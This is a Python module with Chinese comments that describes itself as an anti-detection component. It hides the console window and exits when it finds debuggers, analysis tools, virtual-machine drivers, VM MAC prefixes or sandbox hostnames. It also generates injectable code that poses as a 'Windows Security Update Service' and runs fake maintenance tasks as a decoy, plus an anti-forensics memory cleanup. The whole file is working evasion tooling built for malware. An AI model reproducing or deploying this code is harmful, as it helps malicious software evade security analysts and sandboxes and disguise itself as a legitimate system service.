# -*- coding: utf-8 -*-
"""
反检测模块
提供反调试、反沙箱等功能
"""
import os
import sys
import time
import random
import platform
import subprocess
import threading
import datetime
from datetime import datetime


def enhanced_evasion_techniques():
    """增强的反检测技术"""
    evasion_code = '''
# 增强反检测技术
import random
import string
import hashlib
import threading
import gc
from datetime import datetime

# 伪装成合法的系统维护脚本
class SystemMaintenanceService:
    def __init__(self):
        self.service_name = "Windows Security Update Service"
        self.version = "10.0.19041.1"
        self.initialized = False
    
    def initialize_service(self):
        """初始化系统服务"""
        if self.initialized:
            return True
        
        # 随机延迟模拟启动时间
        import time
        time.sleep(random.uniform(2.0, 5.0))
        
        # 内存清理
        gc.collect()
        
        # 生成合法服务ID
        service_id = hashlib.md5(
            f"{self.service_name}{datetime.now()}".encode()
        ).hexdigest()[:16]
        
        self.initialized = True
        return True
    
    def perform_maintenance(self):
        """执行系统维护"""
        if not self.initialized:
            self.initialize_service()
        
        # 模拟维护任务
        maintenance_tasks = [
            "Checking system integrity...",
            "Updating security definitions...", 
            "Optimizing system performance...",
            "Cleaning temporary files...",
            "Verifying system certificates..."
        ]
        
        for task in maintenance_tasks:
            # 模拟工作
            time.sleep(random.uniform(0.5, 1.5))
            
        return True

# 增强的环境检测
def is_analysis_environment():
    """检测是否在分析环境中运行"""
    try:
        # 检查虚拟机特征文件
        vm_files = [
            '/proc/scsi/scsi',
            '/sys/class/dmi/id/product_name',
            '/sys/class/dmi/id/sys_vendor',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys'
        ]
        
        for vm_file in vm_files:
            try:
                if os.path.exists(vm_file):
                    with open(vm_file, 'r', errors='ignore') as f:
                        content = f.read().lower()
                        if any(keyword in content for keyword in 
                              ['virtualbox', 'vmware', 'qemu', 'xen', 'vbox']):
                            return True
            except:
                continue
        
        # 检查处理器数量（沙箱通常只有1-2个核心）
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            return True
        
        return False
    except:
        return False

# 内存清理和反取证
def memory_cleanup():
    """内存清理和反取证"""
    try:
        import gc
        
        # 强制垃圾回收
        for _ in range(3):
            gc.collect()
        
        # 生成噪声数据覆盖内存痕迹
        noise_data = []
        for _ in range(100):
            noise_data.append(''.join(random.choices(
                string.ascii_letters + string.digits, k=1024
            )))
        
        # 清理噪声数据
        del noise_data
        gc.collect()
        
        return True
    except:
        return False
'''
    return evasion_code


def hide_console():
    """隐藏控制台窗口"""
    if platform.system() == "Windows":
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        except:
            pass


def anti_debug_checks():
    """多重反调试检测"""
    try:
        # 检测调试器进程
        debug_processes = [
            'ollydbg.exe', 'ProcessHacker.exe', 'tcpview.exe', 'autoruns.exe',
            'autorunsc.exe', 'filemon.exe', 'procmon.exe', 'regmon.exe',
            'procexp.exe', 'idaq.exe', 'idaq64.exe', 'ImmunityDebugger.exe',
            'Wireshark.exe', 'dumpcap.exe', 'HookExplorer.exe', 'ImportREC.exe',
            'PETools.exe', 'LordPE.exe', 'SysInspector.exe', 'proc_analyzer.exe',
            'sysAnalyzer.exe', 'sniff_hit.exe', 'winAPIoverride.exe',
            'apimonitor.exe', 'x32dbg.exe', 'x64dbg.exe', 'windbg.exe',
            'gdb.exe', 'python.exe', 'pythonw.exe'
        ]
        
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output('tasklist', shell=True, 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        else:
            try:
                output = subprocess.check_output(['ps', 'aux'], 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        
        # 检测Python调试模式
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return False
            
        return True
    except:
        return True


def advanced_sandbox_detection():
    """高级沙箱环境检测"""
    try:
        # 1. 时间检测 - 检测时间加速
        start_time = time.time()
        time.sleep(1.5)
        elapsed = time.time() - start_time
        if elapsed < 1.2:  # 时间被加速
            return False
        
        # 2. 主机名检测
        hostname = platform.node().lower()
        vm_hostnames = ['sandbox', 'malware', 'virus', 'test', 'analysis', 
                       'vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
        for vm_name in vm_hostnames:
            if vm_name in hostname:
                return False
        
        # 3. MAC地址检测
        try:
            import uuid
            mac = hex(uuid.getnode())[2:].upper()
            vm_macs = [
                '000569',  # VMware
                '000C29',  # VMware
                '001C14',  # VMware
                '005056',  # VMware
                '0A0027',  # VirtualBox
                '080027'   # VirtualBox
            ]
            for vm_mac in vm_macs:
                if mac.startswith(vm_mac):
                    return False
        except:
            pass
        
        return True
    except:
        return False


def analysis_delay(delay_seconds=30):
    """分析延迟，增加检测难度"""
    try:
        # 分多段延迟，避免一次性长时间暂停
        segments = random.randint(3, 8)
        segment_delay = delay_seconds / segments
        
        for _ in range(segments):
            time.sleep(random.uniform(segment_delay * 0.5, segment_delay * 1.5))
        
        # 额外随机延迟
        time.sleep(random.uniform(1, delay_seconds / 6))
        
    except:
        time.sleep(delay_seconds)


def comprehensive_environment_check(silent_delay=30, strict_mode=True):
    """综合环境检查（增加可配置性）
    
    Args:
        silent_delay: 延迟时间（秒）
        strict_mode: 严格模式，False时降低检测强度
    """
    try:
        # 隐藏控制台
        hide_console()
        
        # 初始延迟（可配置）
        if silent_delay > 0:
            analysis_delay(silent_delay)
        
        # 反调试检测（严格模式下启用）
        if strict_mode and not anti_debug_checks():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        # 沙箱检测（严格模式下启用）
        if strict_mode and not advanced_sandbox_detection():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        return True
    except:
        # 在非严格模式下，异常时继续执行
        if not strict_mode:
            return True
        return False


def create_advanced_evasion_code():
    """创建高级反检测代码"""
    # 获取增强的反检测技术代码
    enhanced_code = enhanced_evasion_techniques()
    
    # 构建完整的反检测代码
    evasion_code = enhanced_code + '''

# 启动系统维护服务
def start_maintenance_service():
    try:
        service = SystemMaintenanceService()
        if service.perform_maintenance():
            return True
    except:
        pass
    return False

# 主反检测函数
def advanced_anti_detection():
    """高级反检测主函数"""
    try:
        # 检查分析环境
        if is_analysis_environment():
            # 执行假的维护任务后退出
            start_maintenance_service()
            import sys
            sys.exit(0)
        
        # 内存清理
        memory_cleanup()
        
        return True
    except:
        return False

# 初始化反检测
if not advanced_anti_detection():
    import sys
    sys.exit(0)
'''
    
    return evasion_code